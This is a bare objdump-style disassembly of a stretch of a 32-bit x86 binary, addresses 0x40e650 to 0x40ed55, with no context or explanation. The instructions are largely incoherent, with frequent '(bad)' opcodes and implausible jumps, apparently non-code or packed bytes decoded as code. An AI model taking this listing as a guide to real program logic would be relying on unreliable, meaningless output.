  40e650:	sub    DWORD PTR [esi-0x12],edx
  40e653:	inc    ecx
  40e654:	push   eax
  40e655:	or     esi,0xc487034c
  40e65b:	sbb    dh,BYTE PTR [ebp+eiz*4-0x1b]
  40e65f:	(bad)  
  40e660:	cmp    edi,DWORD PTR [esi]
  40e662:	jecxz  0x40e5eb
  40e664:	pop    edx
  40e665:	dec    DWORD PTR [eax-0x69]
  40e668:	sub    ah,BYTE PTR [ebp+0x66]
  40e66b:	int    0xbb
  40e66d:	loope  0x40e6bd
  40e66f:	frstor [ecx-0x5e]
  40e672:	push   ss
  40e673:	ret    
  40e674:	pusha  
  40e675:	in     al,dx
  40e676:	push   esp
  40e677:	mov    cl,0xea
  40e679:	xor    edx,DWORD PTR [ebx+0x2f]
  40e67c:	es inc edx
  40e67e:	xchg   ebp,eax
  40e67f:	pop    edi
  40e680:	and    edx,DWORD PTR [esi]
  40e682:	or     edi,DWORD PTR [ebx]
  40e684:	mov    esi,0x72587e9a
  40e689:	jae    0x40e6da
  40e68b:	adc    al,0xe8
  40e68d:	aaa    
  40e68e:	pop    ds
  40e68f:	loop   0x40e68c
  40e691:	push   ebp
  40e692:	scas   eax,DWORD PTR es:[edi]
  40e693:	add    bl,BYTE PTR [eax]
  40e695:	xor    DWORD PTR [edx+edi*1+0x51],esp
  40e699:	cmp    edi,ebp
  40e69b:	daa    
  40e69c:	fstp   st(0)
  40e69e:	imul   edi,DWORD PTR [ebx],0x7e
  40e6a1:	popa   
  40e6a2:	xchg   edi,eax
  40e6a3:	icebp  
  40e6a4:	lahf   
  40e6a5:	int3   
  40e6a6:	and    ecx,DWORD PTR [ecx]
  40e6a8:	mov    ds:0xe3bfe1f1,al
  40e6ad:	sub    eax,0xf408d802
  40e6b2:	and    al,0x9e
  40e6b4:	call   0x829d07bd
  40e6b9:	lds    ecx,FWORD PTR [edi-0x48]
  40e6bc:	cmp    dl,BYTE PTR [edx]
  40e6be:	mov    edi,0x3f1e0527
  40e6c3:	sub    BYTE PTR [edi+0x71],0xbb
  40e6c7:	jae    0x40e6f6
  40e6c9:	xchg   esp,eax
  40e6ca:	cmp    eax,0x6911764b
  40e6cf:	fnclex 
  40e6d1:	jg     0x40e715
  40e6d3:	in     al,0x75
  40e6d5:	aaa    
  40e6d6:	test   al,0x34
  40e6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6d9:	adc    al,0xcb
  40e6db:	adc    ecx,ebx
  40e6dd:	stos   BYTE PTR es:[edi],al
  40e6de:	mov    edi,0xc1abcf0d
  40e6e3:	outs   dx,BYTE PTR ds:[esi]
  40e6e4:	mov    esp,0x8438aada
  40e6e9:	jne    0x40e6c2
  40e6eb:	and    DWORD PTR [esi-0x1e],edi
  40e6ee:	sub    al,0x77
  40e6f0:	in     eax,dx
  40e6f1:	cmp    ch,BYTE PTR [edx+eiz*1-0x6ab730be]
  40e6f8:	ror    BYTE PTR [edi+edx*4+0x1619a7ed],cl
  40e6ff:	and    DWORD PTR [edi+0x72],ecx
  40e702:	cmp    eax,0x35dcee2e
  40e707:	lahf   
  40e708:	sub    al,0xe5
  40e70a:	mov    esp,0xd3c9b441
  40e70f:	in     al,dx
  40e710:	lock push ss
  40e712:	lds    edx,FWORD PTR [ebx-0x32058f4c]
  40e718:	cmp    bh,BYTE PTR [edi-0x7]
  40e71b:	push   cs
  40e71c:	pop    es
  40e71d:	dec    ebp
  40e71e:	xchg   esi,eax
  40e71f:	dec    esi
  40e720:	loop   0x40e6b0
  40e722:	jecxz  0x40e6c4
  40e724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e725:	push   ebx
  40e726:	xchg   ebp,eax
  40e727:	ins    BYTE PTR es:[edi],dx
  40e728:	(bad)  
  40e72a:	inc    ebp
  40e72b:	(bad)  
  40e72c:	test   eax,0x6dede6f7
  40e731:	fidiv  DWORD PTR [ecx+0x78]
  40e734:	mov    edi,0xe943f981
  40e739:	and    BYTE PTR [esi+0x7974525d],ah
  40e73f:	mov    edx,0x53c1629d
  40e744:	pop    esi
  40e745:	mov    cl,0x62
  40e747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e748:	and    dl,BYTE PTR [edi-0x2c]
  40e74b:	sti    
  40e74c:	sub    al,0xb4
  40e74e:	push   ebp
  40e74f:	les    eax,FWORD PTR [edx-0x59]
  40e752:	mov    edi,DWORD PTR ds:0x90d13236
  40e758:	call   0xc01e:0x4b5871ab
  40e75f:	jne    0x40e7cd
  40e761:	or     DWORD PTR [ecx],0xffffffe0
  40e764:	stos   BYTE PTR es:[edi],al
  40e765:	push   ebp
  40e766:	(bad)  
  40e768:	jae    0x40e7d0
  40e76a:	sahf   
  40e76b:	cs jb  0x40e70f
  40e76e:	push   cs
  40e76f:	hlt    
  40e770:	daa    
  40e771:	jbe    0x40e784
  40e773:	fwait
  40e774:	mov    dl,0xd9
  40e776:	xchg   edx,eax
  40e777:	sar    DWORD PTR [eax],0x31
  40e77a:	(bad)  
  40e77b:	leave  
  40e77c:	lahf   
  40e77d:	mov    bh,0x6d
  40e77f:	sub    eax,0x95257180
  40e784:	stos   BYTE PTR es:[edi],al
  40e785:	out    0x2f,eax
  40e787:	dec    eax
  40e788:	pop    ss
  40e789:	jp     0x40e7bd
  40e78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e78c:	or     al,0x8a
  40e78e:	xchg   ebp,eax
  40e78f:	lods   al,BYTE PTR ds:[esi]
  40e790:	lock lea edx,[ecx+esi*8-0x2f]
  40e795:	outs   dx,BYTE PTR ds:[esi]
  40e796:	rcr    ch,0x5
  40e799:	les    esp,FWORD PTR [edi+0x21137f27]
  40e79f:	ds sub ch,0x7f
  40e7a3:	loopne 0x40e7a7
  40e7a5:	(bad)  
  40e7a7:	in     eax,0xc5
  40e7a9:	into   
  40e7aa:	inc    esi
  40e7ab:	lahf   
  40e7ac:	pop    ecx
  40e7ad:	xchg   ebp,ebx
  40e7af:	arpl   WORD PTR [ecx],sp
  40e7b1:	std    
  40e7b2:	ss jmp 0x364a:0x6d39eedc
  40e7ba:	push   edi
  40e7bb:	cmp    esi,ebx
  40e7bd:	mov    ds:0x23d898a9,al
  40e7c2:	loopne 0x40e765
  40e7c4:	pusha  
  40e7c5:	loope  0x40e774
  40e7c7:	or     al,bh
  40e7c9:	pop    ds
  40e7ca:	pop    edi
  40e7cb:	jne    0x40e78e
  40e7cd:	push   edi
  40e7ce:	test   ecx,eax
  40e7d0:	dec    eax
  40e7d1:	ins    DWORD PTR es:[edi],dx
  40e7d2:	cs inc eax
  40e7d4:	ja     0x8e72d542
  40e7da:	pop    esi
  40e7db:	jno    0x40e856
  40e7dd:	mov    dh,0xe3
  40e7df:	and    edi,DWORD PTR [edx+0x75]
  40e7e2:	pop    ecx
  40e7e3:	xchg   ebp,eax
  40e7e4:	xor    DWORD PTR [edx-0x79],esp
  40e7e7:	push   0x0
  40e7e9:	mov    dh,bh
  40e7eb:	xchg   DWORD PTR [ecx],edx
  40e7ed:	imul   DWORD PTR [edi*4+0x24799c5d]
  40e7f4:	rcl    DWORD PTR [ecx-0x75],0x8f
  40e7f8:	mov    al,0x71
  40e7fa:	mov    ebp,0x6c579c0f
  40e7ff:	xor    DWORD PTR [ebx],edi
  40e801:	int3   
  40e802:	cmp    eax,0x427266cd
  40e807:	es ins DWORD PTR es:[edi],dx
  40e809:	xchg   DWORD PTR [ebx+0x21],edi
  40e80c:	sbb    ah,BYTE PTR gs:[edi-0x1f2182f1]
  40e813:	adc    ebp,DWORD PTR [ecx+0x42]
  40e816:	in     eax,dx
  40e817:	das    
  40e818:	sub    ebx,DWORD PTR [edi+0x473d11ac]
  40e81e:	jbe    0x40e7ea
  40e820:	mov    DWORD PTR [ecx-0x3d],ebp
  40e823:	bound  ecx,QWORD PTR [esi]
  40e825:	push   0xfffffffb
  40e827:	fimul  WORD PTR [eax-0x11]
  40e82a:	pop    edi
  40e82b:	inc    ebp
  40e82c:	xor    bh,dh
  40e82e:	dec    edx
  40e82f:	inc    ebx
  40e830:	sbb    ch,BYTE PTR [esi+0x1e]
  40e833:	cmp    eax,0x8536be1e
  40e838:	inc    ecx
  40e839:	mov    eax,ds:0xd4ddbda5
  40e83e:	arpl   WORD PTR [ebx-0xe175b5f],sp
  40e844:	jecxz  0x40e7d4
  40e846:	add    DWORD PTR [esi],ebx
  40e848:	and    al,0xca
  40e84a:	rcl    DWORD PTR [edx+0x5],1
  40e84d:	jo     0x40e852
  40e84f:	icebp  
  40e850:	scas   al,BYTE PTR es:[edi]
  40e851:	push   ds
  40e852:	jnp    0x40e7fe
  40e854:	pop    ds
  40e855:	inc    eax
  40e856:	mov    ecx,0xa2c1b05d
  40e85b:	and    BYTE PTR [esi-0xc],bh
  40e85e:	or     BYTE PTR [ecx-0x6b],cl
  40e861:	nop
  40e862:	lock xor edx,edi
  40e865:	xchg   ecx,eax
  40e866:	ja     0x40e7eb
  40e868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e869:	mov    bl,0xd5
  40e86b:	add    eax,DWORD PTR [ebx]
  40e86d:	leavew 
  40e86f:	inc    ebp
  40e870:	pop    eax
  40e871:	xchg   edx,eax
  40e872:	fnstcw WORD PTR [ecx]
  40e874:	outs   dx,BYTE PTR ds:[esi]
  40e875:	xchg   edx,eax
  40e876:	push   esp
  40e877:	(bad)  
  40e879:	add    DWORD PTR [edx+0x568a80ca],eax
  40e87f:	cmp    al,0x1f
  40e881:	xchg   esi,esp
  40e883:	dec    eax
  40e884:	jnp    0x40e8af
  40e886:	popf   
  40e887:	mov    BYTE PTR [edx-0xb],ah
  40e88a:	ja     0x40e855
  40e88c:	fdivr  DWORD PTR [edx+ecx*2]
  40e88f:	push   esp
  40e890:	xchg   esi,eax
  40e891:	mov    ecx,0x5e678cf3
  40e896:	imul   esi,edi,0x36f049b0
  40e89c:	dec    edi
  40e89d:	xchg   esi,eax
  40e89e:	(bad)  
  40e89f:	sbb    al,BYTE PTR [edi]
  40e8a1:	jg     0x40e908
  40e8a3:	ret    0x3cdf
  40e8a6:	mov    ?,WORD PTR [eax-0x6e6ba645]
  40e8ac:	daa    
  40e8ad:	(bad)  
  40e8ae:	mov    ah,0x56
  40e8b0:	dec    edx
  40e8b1:	std    
  40e8b2:	sub    eax,0x60f54494
  40e8b7:	test   BYTE PTR [edx+0x2596e6cb],ah
  40e8bd:	fsubp  st(5),st
  40e8bf:	push   ebp
  40e8c0:	(bad)  
  40e8c2:	cdq    
  40e8c3:	xor    esp,DWORD PTR [edx-0x70]
  40e8c6:	sub    al,0x80
  40e8c8:	in     al,dx
  40e8c9:	jno    0x40e945
  40e8cb:	in     eax,0x2a
  40e8cd:	std    
  40e8ce:	mov    eax,ds:0x437547dc
  40e8d3:	loope  0x40e8b8
  40e8d5:	mov    bh,0xbf
  40e8d7:	cmp    al,0x50
  40e8d9:	loopne 0x40e953
  40e8db:	add    ah,BYTE PTR [edx+0x609a4b1a]
  40e8e1:	lods   al,BYTE PTR ds:[esi]
  40e8e2:	fcomp  st(3)
  40e8e4:	lock cmc 
  40e8e6:	ret    
  40e8e7:	pop    ecx
  40e8e8:	sahf   
  40e8e9:	or     BYTE PTR [ebp+0x50],bl
  40e8ec:	mov    ?,WORD PTR [edx+0x1a9a9652]
  40e8f2:	sbb    DWORD PTR [eax-0x15],edi
  40e8f5:	cmp    bl,BYTE PTR [ebx+0x6]
  40e8f8:	loop   0x40e972
  40e8fa:	cmp    al,0x1b
  40e8fc:	ins    DWORD PTR es:[edi],dx
  40e8fd:	test   al,0xdf
  40e8ff:	xchg   esp,eax
  40e900:	clc    
  40e901:	xor    DWORD PTR [eax+eiz*2-0x7],esi
  40e905:	fmul   DWORD PTR [di-0x7928]
  40e90a:	ins    BYTE PTR es:[edi],dx
  40e90b:	pop    eax
  40e90c:	rol    BYTE PTR [edx],cl
  40e90e:	enter  0x3a14,0x3a
  40e912:	in     eax,dx
  40e913:	sub    DWORD PTR [ecx-0x2b92707e],0xffffffc4
  40e91a:	into   
  40e91b:	mov    ds:0x686ad0eb,eax
  40e920:	and    DWORD PTR [edx-0x42bdb688],edi
  40e926:	imul   ebp,DWORD PTR [ebx],0xffffff9a
  40e929:	test   BYTE PTR ds:0x3e91b4f5,ch
  40e92f:	xchg   dl,bl
  40e931:	mov    eax,ds:0x84770e1
  40e936:	in     eax,dx
  40e937:	(bad)  
  40e938:	retf   0xc910
  40e93b:	jne    0x40e994
  40e93d:	repnz sub eax,0x5d43714c
  40e943:	pop    esp
  40e944:	dec    esp
  40e945:	or     esi,edi
  40e947:	popf   
  40e948:	xchg   edi,eax
  40e949:	neg    cl
  40e94b:	xchg   esp,eax
  40e94c:	(bad)  
  40e94d:	std    
  40e94e:	sub    al,0xd8
  40e950:	(bad)  
  40e951:	pop    esi
  40e952:	jae    0x40e9bd
  40e954:	mov    bl,0x16
  40e956:	sub    BYTE PTR [ecx],bh
  40e958:	pop    es
  40e959:	clc    
  40e95a:	cmp    edx,DWORD PTR [edi-0x58]
  40e95d:	pop    eax
  40e95e:	gs or  eax,0xc94a1462
  40e964:	loopne 0x40e96e
  40e966:	daa    
  40e967:	add    al,0xfa
  40e969:	mov    ebp,DWORD PTR [ecx+eiz*1]
  40e96c:	xchg   ecx,eax
  40e96d:	sbb    eax,0x8991d3fc
  40e972:	daa    
  40e973:	cmp    DWORD PTR [ebp-0x38],esi
  40e976:	sub    esi,0x528aed51
  40e97c:	mov    edi,0x3b646f1a
  40e981:	jle    0x40e9f8
  40e983:	sar    ebx,cl
  40e985:	pop    ecx
  40e986:	les    eax,FWORD PTR [ecx+esi*8+0x67a749e5]
  40e98d:	jb     0x40e9ee
  40e98f:	sub    BYTE PTR [esp+ecx*1-0x514911a4],ch
  40e996:	loop   0x40e9c3
  40e998:	mov    ch,ch
  40e99a:	adc    esi,DWORD PTR [ebp-0x5d64c149]
  40e9a0:	jge    0x40e9e4
  40e9a2:	mov    bl,0x1b
  40e9a4:	cmp    ch,BYTE PTR [ebp+0x1d]
  40e9a7:	inc    eax
  40e9a8:	or     al,0x15
  40e9aa:	and    eax,0xdd55cf6e
  40e9af:	add    al,0x34
  40e9b1:	xor    BYTE PTR [esp+edi*2],0xbb
  40e9b5:	jbe    0x40e9bb
  40e9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b8:	xlat   BYTE PTR ds:[ebx]
  40e9b9:	stos   BYTE PTR es:[edi],al
  40e9ba:	inc    edi
  40e9bb:	mov    ecx,DWORD PTR [ebp-0x5e35c4b8]
  40e9c1:	inc    edi
  40e9c2:	sbb    al,0xe0
  40e9c4:	cmp    eax,0x1e1e3fd7
  40e9c9:	scas   eax,DWORD PTR es:[edi]
  40e9ca:	addr16 mov ebp,0x1c34663a
  40e9d0:	sub    BYTE PTR [ebp+eiz*1-0x4fcd0187],0x48
  40e9d8:	cdq    
  40e9d9:	mov    WORD PTR [ebx],ds
  40e9db:	sub    cl,bh
  40e9dd:	and    BYTE PTR [ecx-0x4b],0xa6
  40e9e1:	enter  0x4fa1,0xa6
  40e9e5:	jge    0x40e990
  40e9e7:	jmp    0xcd9d37e8
  40e9ec:	push   esp
  40e9ed:	das    
  40e9ee:	xor    bl,BYTE PTR [ebx]
  40e9f0:	jecxz  0x40e9b3
  40e9f2:	and    DWORD PTR [edi],eax
  40e9f4:	add    cl,cl
  40e9f6:	push   0x1a
  40e9f8:	xor    al,0xe0
  40e9fa:	inc    ebx
  40e9fb:	push   ebp
  40e9fc:	retf   
  40e9fd:	xchg   ebx,eax
  40e9fe:	cli    
  40e9ff:	dec    ebx
  40ea00:	fcmovu st,st(0)
  40ea02:	add    al,0x45
  40ea04:	adc    dh,0xce
  40ea07:	in     eax,0xc1
  40ea09:	(bad)  
  40ea0b:	mov    bl,0x49
  40ea0d:	(bad)  
  40ea0e:	push   0xffffffaa
  40ea10:	xchg   edx,eax
  40ea11:	sub    DWORD PTR [edx*2+0x35f5f0f8],eax
  40ea18:	pop    ds
  40ea19:	popa   
  40ea1a:	jg     0x40e9f3
  40ea1c:	inc    edi
  40ea1d:	xor    al,0x8f
  40ea1f:	mov    eax,ds:0xdfb8d877
  40ea24:	lds    ecx,FWORD PTR [edx+ebp*8-0x20]
  40ea28:	mov    bl,0xb3
  40ea2a:	and    BYTE PTR [eax],ch
  40ea2c:	add    al,0x7a
  40ea2f:	xor    esp,esp
  40ea31:	push   eax
  40ea32:	mov    ch,0xf1
  40ea34:	jns    0x40ea46
  40ea36:	fistp  WORD PTR [ecx-0x71f3eed7]
  40ea3c:	popa   
  40ea3d:	jnp    0x40e9f4
  40ea3f:	loopne 0x40ea06
  40ea41:	mov    al,0xa3
  40ea43:	or     eax,0xcdb69d74
  40ea48:	mov    al,0xf3
  40ea4a:	inc    eax
  40ea4b:	ficom  DWORD PTR [esi+eiz*1+0x5c7149a6]
  40ea52:	icebp  
  40ea53:	(bad)  
  40ea54:	repz sbb esp,DWORD PTR [ebx+0x1fe0c22b]
  40ea5b:	push   esi
  40ea5c:	retf   
  40ea5d:	ret    
  40ea5e:	out    dx,al
  40ea5f:	mov    ah,0xc
  40ea61:	or     eax,0xcd5c40e4
  40ea66:	aaa    
  40ea67:	retf   0x790f
  40ea6a:	xchg   edx,eax
  40ea6b:	arpl   WORD PTR ds:0xddc8799,sp
  40ea71:	loop   0x40ea9b
  40ea73:	fisub  WORD PTR [ecx-0xf235eca]
  40ea79:	push   cs
  40ea7a:	fcmovne st,st(1)
  40ea7c:	ret    0x1466
  40ea7f:	(bad)  
  40ea80:	dec    ecx
  40ea81:	sar    DWORD PTR [ebx-0x54],1
  40ea84:	sbb    al,0xd5
  40ea86:	mov    esi,0x20d4905
  40ea8b:	mov    ch,0x31
  40ea8d:	sub    al,0x28
  40ea8f:	or     BYTE PTR [edx+0x39],al
  40ea92:	test   eax,0x439d0451
  40ea97:	jno    0x40eaee
  40ea99:	mov    al,ds:0xa4047376
  40ea9e:	pop    ecx
  40ea9f:	push   es
  40eaa0:	xchg   ecx,eax
  40eaa1:	xor    dl,BYTE PTR [esi+0x4a]
  40eaa4:	(bad)
  40eaa7:	in     eax,0x18
  40eaa9:	inc    esi
  40eaaa:	out    0x7a,eax
  40eaac:	iret   
  40eaad:	nop    DWORD PTR [ecx+0x21f73cbb]
  40eab4:	jg     0x40eaba
  40eab6:	add    al,0xce
  40eab8:	outs   dx,DWORD PTR ds:[esi]
  40eab9:	call   0x4f5f:0x5b8f
  40eabf:	adc    ah,BYTE PTR [ebx+eiz*8-0x11676e20]
  40eac6:	sbb    DWORD PTR [ebp+0x2c],esp
  40eac9:	adc    BYTE PTR [esi],ch
  40eacb:	inc    esi
  40eacc:	mov    esi,0x268ea55c
  40ead1:	jg     0x40ea5a
  40ead3:	pushf  
  40ead4:	add    esp,DWORD PTR [esi]
  40ead6:	pop    edi
  40ead7:	adc    al,BYTE PTR [ebx]
  40ead9:	dec    esi
  40eada:	or     DWORD PTR [ecx+eax*8+0x1a],0x5fa6265
  40eae2:	xchg   edi,eax
  40eae3:	ins    DWORD PTR es:[edi],dx
  40eae4:	fld    QWORD PTR [edx+0x49]
  40eae7:	adc    al,0xfa
  40eae9:	std    
  40eaea:	sub    ah,BYTE PTR [esi+0x4fcde3e]
  40eaf0:	mov    ah,0xf7
  40eaf2:	rcr    DWORD PTR [ebx-0x3ba74764],cl
  40eaf8:	mov    al,0x52
  40eafa:	inc    esp
  40eafb:	leave  
  40eafc:	mov    eax,0x8c655a15
  40eb01:	int3   
  40eb02:	in     eax,dx
  40eb03:	daa    
  40eb04:	sar    DWORD PTR [ebp+0x21],0xa0
  40eb08:	loop   0x40eb2d
  40eb0a:	push   cs
  40eb0b:	aas    
  40eb0c:	cmp    ebp,DWORD PTR [ebx]
  40eb0e:	cmp    DWORD PTR [eax-0x1d],ebx
  40eb11:	sbb    al,al
  40eb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb14:	mov    al,ds:0x91d0b253
  40eb19:	jns    0x40eb45
  40eb1b:	out    dx,al
  40eb1c:	sub    ch,BYTE PTR [ecx-0x6c]
  40eb1f:	daa    
  40eb20:	mov    dl,0x59
  40eb22:	adc    al,0x6f
  40eb24:	mov    ?,edi
  40eb26:	fistp  DWORD PTR [ebx]
  40eb28:	sub    esi,DWORD PTR [edi+esi*1]
  40eb2b:	loop   0x40eae8
  40eb2d:	mov    al,ds:0x214fbe54
  40eb32:	imul   eax,DWORD PTR [ecx+0x11703a4f],0xffffffa7
  40eb39:	pop    ecx
  40eb3a:	push   edi
  40eb3b:	bound  edx,QWORD PTR [ecx+0x4a919f4c]
  40eb41:	jge    0x40eacc
  40eb43:	aam    0x3e
  40eb45:	jmp    0x1d77f290
  40eb4a:	std    
  40eb4b:	cmp    edi,DWORD PTR [ebp+0x164686a4]
  40eb51:	sub    al,BYTE PTR [edx]
  40eb53:	out    0x4c,eax
  40eb55:	cmp    BYTE PTR [ebx+eiz*8],bh
  40eb58:	xchg   edi,eax
  40eb59:	add    DWORD PTR ds:[edx],edi
  40eb5c:	mov    bl,0x60
  40eb5e:	retf   
  40eb5f:	and    DWORD PTR [eax-0x17374d37],edx
  40eb65:	pop    ss
  40eb66:	cmc    
  40eb67:	jmp    0x40eb30
  40eb69:	arpl   WORD PTR [ecx],di
  40eb6b:	stos   DWORD PTR es:[edi],eax
  40eb6c:	and    dh,cl
  40eb6e:	clc    
  40eb6f:	lods   al,BYTE PTR ds:[esi]
  40eb70:	sbb    al,0x58
  40eb72:	nop
  40eb73:	(bad)  
  40eb74:	popa   
  40eb75:	pop    ss
  40eb76:	ds (bad) 
  40eb78:	xlat   BYTE PTR ds:[ebx]
  40eb79:	jne    0x40eb89
  40eb7b:	mov    edi,?
  40eb7d:	pop    edi
  40eb7e:	mov    DWORD PTR [eax-0x441ef71a],edx
  40eb84:	inc    ebx
  40eb85:	sbb    eax,esp
  40eb87:	adc    BYTE PTR [esi],dl
  40eb89:	sahf   
  40eb8a:	jmp    0x9ea198d8
  40eb8f:	jno    0x40eb67
  40eb91:	pop    ecx
  40eb92:	cmp    BYTE PTR [eax+0x2005edd1],dl
  40eb98:	jecxz  0x40ec0d
  40eb9a:	dec    esi
  40eb9b:	aaa    
  40eb9c:	lods   eax,DWORD PTR ds:[esi]
  40eb9d:	je     0x40eb50
  40eb9f:	rcr    BYTE PTR [edx+ecx*2],0x36
  40eba3:	das    
  40eba4:	out    0x7f,eax
  40eba6:	daa    
  40eba7:	shr    DWORD PTR [eax+0x5d],0xbc
  40ebab:	sbb    al,0x89
  40ebad:	jecxz  0x40ebaa
  40ebaf:	jbe    0x40ebcc
  40ebb1:	inc    ebx
  40ebb2:	sahf   
  40ebb3:	outs   dx,BYTE PTR ds:[esi]
  40ebb4:	(bad)
  40ebb7:	lea    ebx,[edi-0xdb42d1]
  40ebbd:	test   DWORD PTR [eax+0x61],edx
  40ebc0:	jp     0x40ebf0
  40ebc2:	pop    esp
  40ebc3:	cmp    BYTE PTR [edx-0x5b58e9d2],al
  40ebc9:	push   cs
  40ebca:	je     0x40eb8b
  40ebcc:	pop    edi
  40ebcd:	dec    eax
  40ebcf:	addr16 sub eax,esp
  40ebd2:	hlt    
  40ebd3:	loop   0x40ebbd
  40ebd5:	mov    ds:0x3ba4c847,al
  40ebda:	jg     0x40ec36
  40ebdc:	push   esi
  40ebdd:	stc    
  40ebde:	dec    edx
  40ebdf:	test   eax,0x606a05aa
  40ebe4:	jbe    0x40ebae
  40ebe6:	in     eax,0x61
  40ebe8:	shl    DWORD PTR [edx],cl
  40ebea:	pusha  
  40ebeb:	cld    
  40ebec:	ret    
  40ebed:	repz xor eax,0x137746d9
  40ebf3:	push   edi
  40ebf4:	and    dl,cl
  40ebf6:	or     eax,DWORD PTR [esi]
  40ebf8:	imul   esp,DWORD PTR [ebp+0x63],0xae8ebfe0
  40ebff:	adc    ebp,ecx
  40ec01:	xchg   edi,eax
  40ec02:	add    al,0x97
  40ec04:	jle    0x40eb96
  40ec06:	les    ebx,FWORD PTR [esi+0xe]
  40ec09:	(bad)  
  40ec0a:	je     0x40ec45
  40ec0c:	push   edi
  40ec0d:	xor    eax,0x6467413c
  40ec12:	sbb    BYTE PTR [ebp+0x62],ah
  40ec15:	nop
  40ec16:	push   esp
  40ec17:	aad    0xcf
  40ec19:	cwde   
  40ec1a:	aas    
  40ec1b:	arpl   si,cx
  40ec1d:	loopne 0x40ebbd
  40ec1f:	popf   
  40ec20:	xchg   esi,eax
  40ec21:	sti    
  40ec22:	push   esi
  40ec23:	cwde   
  40ec24:	gs cld 
  40ec26:	push   cs
  40ec27:	adc    DWORD PTR [ecx+0x6e8ddf07],ecx
  40ec2d:	mov    cl,0xec
  40ec2f:	push   ebx
  40ec30:	nop
  40ec31:	or     DWORD PTR [ecx],edi
  40ec33:	sar    DWORD PTR [eax+0x3e624e4],1
  40ec39:	rcl    BYTE PTR [ebx],1
  40ec3b:	loope  0x40ebe8
  40ec3d:	rol    DWORD PTR [ecx+ebx*2+0xcc40064],0xd5
  40ec45:	sub    ah,BYTE PTR [ecx]
  40ec47:	inc    esi
  40ec48:	shr    dh,cl
  40ec4a:	stc    
  40ec4b:	fdivr  st(3),st
  40ec4d:	call   0x97ee:0xd48403d6
  40ec54:	mov    BYTE PTR [ebx+0x3f],al
  40ec57:	aaa    
  40ec58:	push   edx
  40ec59:	dec    edx
  40ec5a:	stc    
  40ec5b:	or     DWORD PTR [edi-0x70],esp
  40ec5e:	clc    
  40ec5f:	jo     0x40ec84
  40ec61:	inc    ebx
  40ec62:	loop   0x40ecc0
  40ec64:	jmp    DWORD PTR [ebp+0x2163ca76]
  40ec6a:	xchg   BYTE PTR [ecx+ebp*1-0x3b4a432f],bh
  40ec71:	shl    BYTE PTR [edx+0x274423ae],cl
  40ec77:	scas   al,BYTE PTR es:[edi]
  40ec78:	cmp    ecx,esi
  40ec7a:	icebp  
  40ec7b:	es test eax,0x26252062
  40ec81:	popa   
  40ec82:	mov    ah,0xee
  40ec84:	data16 int 0xad
  40ec87:	adc    bh,dl
  40ec89:	inc    ebp
  40ec8a:	cmp    bh,BYTE PTR [edi+0x6a]
  40ec8d:	test   al,0xe0
  40ec8f:	cdq    
  40ec90:	cmp    al,BYTE PTR [esi-0x52]
  40ec93:	push   ebp
  40ec94:	mov    al,0x2c
  40ec96:	mov    ch,0xad
  40ec98:	outs   dx,DWORD PTR ds:[esi]
  40ec99:	test   eax,0x95197f2a
  40ec9e:	bound  edi,QWORD PTR [ebx-0x1f]
  40eca1:	ret    0x9a2a
  40eca4:	icebp  
  40eca5:	mov    eax,0xe584deb6
  40ecaa:	jns    0x40ecd9
  40ecac:	cmp    bl,BYTE PTR [eax+ebx*8+0x30]
  40ecb0:	popf   
  40ecb1:	jnp    0x40ec96
  40ecb3:	add    esp,eax
  40ecb5:	jecxz  0x40ecdf
  40ecb7:	scas   al,BYTE PTR es:[edi]
  40ecb8:	and    al,ah
  40ecba:	xchg   esp,eax
  40ecbb:	xor    eax,0x96df9ce
  40ecc0:	jnp    0x40ec74
  40ecc2:	xchg   ch,ch
  40ecc4:	pop    ecx
  40ecc5:	aas    
  40ecc6:	add    DWORD PTR [ebp-0x5f],edx
  40ecc9:	dec    esi
  40ecca:	btr    DWORD PTR [ebp-0x394cb06],edi
  40ecd1:	xchg   ebp,eax
  40ecd2:	mov    esi,0x4550e677
  40ecd7:	sbb    eax,0x40d2d125
  40ecdc:	mov    DWORD PTR [esi+0x7e],esp
  40ecdf:	mov    dh,0x83
  40ece1:	inc    ebx
  40ece2:	inc    eax
  40ece3:	inc    edx
  40ece4:	mul    dl
  40ece6:	pop    edi
  40ece7:	ins    BYTE PTR es:[edi],dx
  40ece8:	hlt    
  40ece9:	push   ds
  40ecea:	fiadd  DWORD PTR [eax+0x1ddbb180]
  40ecf0:	loopne 0x40ec9f
  40ecf2:	inc    edx
  40ecf3:	test   BYTE PTR [ecx+0x13e0509],ah
  40ecf9:	mov    ch,0x1a
  40ecfb:	xchg   esi,eax
  40ecfc:	or     dl,cl
  40ecfe:	shl    bl,0xec
  40ed01:	js     0x40ed60
  40ed03:	dec    ecx
  40ed04:	clc    
  40ed05:	sti    
  40ed06:	sahf   
  40ed07:	shl    bl,0xb0
  40ed0a:	retf   0xbf70
  40ed0d:	sahf   
  40ed0e:	sub    BYTE PTR [eax-0x6e],ch
  40ed11:	in     eax,dx
  40ed12:	cmp    eax,eax
  40ed14:	pop    ebp
  40ed15:	lahf   
  40ed16:	shl    DWORD PTR [edx-0x741230f],cl
  40ed1c:	and    esi,ecx
  40ed1e:	(bad)  
  40ed1f:	out    dx,eax
  40ed20:	mov    dh,0xf1
  40ed22:	mov    al,ds:0x70579b86
  40ed27:	in     eax,0xaf
  40ed29:	daa    
  40ed2a:	push   ebp
  40ed2b:	mov    dl,0x30
  40ed2d:	jne    0x40eceb
  40ed2f:	inc    ecx
  40ed30:	adc    al,0x31
  40ed32:	jge    0x40ece1
  40ed34:	dec    ebp
  40ed35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed36:	inc    edx
  40ed37:	lods   eax,DWORD PTR ds:[esi]
  40ed38:	xchg   edi,eax
  40ed39:	push   es
  40ed3a:	(bad)  
  40ed3c:	inc    edx
  40ed3d:	fidivr WORD PTR ds:[edx]
  40ed40:	repnz imul ax,WORD PTR [ebp-0x5d],0x2f
  40ed46:	mov    ebp,0x9ae4cd12
  40ed4b:	outs   dx,BYTE PTR ds:[esi]
  40ed4d:	sar    DWORD PTR [esi+0x466674d0],0xa3
  40ed54:	inc    ebx
  40ed55:	sbb    ch,BYTE PTR [ecx+0x5d]
